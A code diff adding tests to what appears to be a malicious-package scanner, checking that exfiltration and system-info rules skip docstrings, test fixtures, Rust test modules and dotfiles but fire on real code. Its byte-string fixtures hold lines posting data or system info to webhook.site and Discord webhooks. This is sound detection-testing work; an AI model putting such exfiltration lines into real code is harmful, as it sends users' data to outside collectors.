@@ -106,6 +106,28 @@ def test_no_rule_fires_on_known_benign_shapes():
             assert package_features.combine(scan, list(shape), ecosystem) is scan, (shape, ecosystem)
 
 
+def test_recall_flags_ignore_test_fixtures_and_python_docstrings():
+    hf_shape = b'''"""Example: requests.post("https://webhook.site/abc", json=system_info)"""\n\ndef whoami():\n    return "current account"\n'''
+    langchain_tests = b'''import requests\n\ndef test_example():\n    requests.post("https://discord.com/api/webhooks/123/token")\n'''
+    assert "exfil_service" not in package_features.profile([("huggingface_hub/hf_api.py", hf_shape)])
+    assert "system_info" not in package_features.profile([("huggingface_hub/__init__.py", b"def whoami(): return client.whoami()")])
+    assert package_features.profile([("langchain_core/tests/unit/test_webhook.py", langchain_tests)]) == []
+
+    actual = b'''def notify(url, data):\n    requests.post("https://webhook.site/abc", json=data)\n'''
+    assert {"exfil_service", "http_send"} <= set(package_features.profile([("pkg/client.py", actual)]))
+
+
+def test_recall_flags_ignore_inline_rust_test_modules_and_metadata_dotfiles():
+    rust = b'''fn run() { println!("ready"); }\n#[cfg(test)]\nmod tests {\n    #[test]\n    fn example() { let url = "https://discord.com/api/webhooks/1/token"; println!("{}", url); }\n}\n'''
+    assert "discord_webhook" not in package_features.profile([("src/lib.rs", rust)])
+    assert package_features.profile([(".gitignore", b"https://webhook.site/example\nos.hostname()")]) == []
+
+
+def test_system_info_whoami_requires_a_process_invocation():
+    assert "system_info" not in package_features.profile([("pkg/auth.py", b"def whoami(): return get_user()")])
+    assert "system_info" in package_features.profile([("pkg/install.py", b"subprocess.run(['whoami'])")])
+
+
 
 def test_browser_version_tracking_packages_are_not_dependency_confusion():
     scan = {"score": 0, "level": "none", "findings": [], "rules_matched": []}
